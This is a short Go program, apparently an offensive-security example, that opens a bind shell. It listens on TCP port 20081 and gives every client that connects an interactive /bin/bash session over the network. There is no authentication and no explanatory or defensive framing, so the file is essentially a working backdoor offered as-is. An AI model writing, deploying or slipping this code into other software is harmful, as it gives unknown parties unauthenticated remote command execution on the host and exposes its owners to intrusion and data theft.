package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	defer conn.Close()
	rp, wp := io.Pipe()
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20081")
	if err != nil {
		log.Fatalln("Unable to bind port", err)
	}
	log.Println("Starting server on port 20081")
	for {
		conn, err := listener.Accept()
		log.Println("Connection received...")
		if err != nil {
			log.Println("Unable to accept connection", err)
		}
		go handle(conn)
	}
}
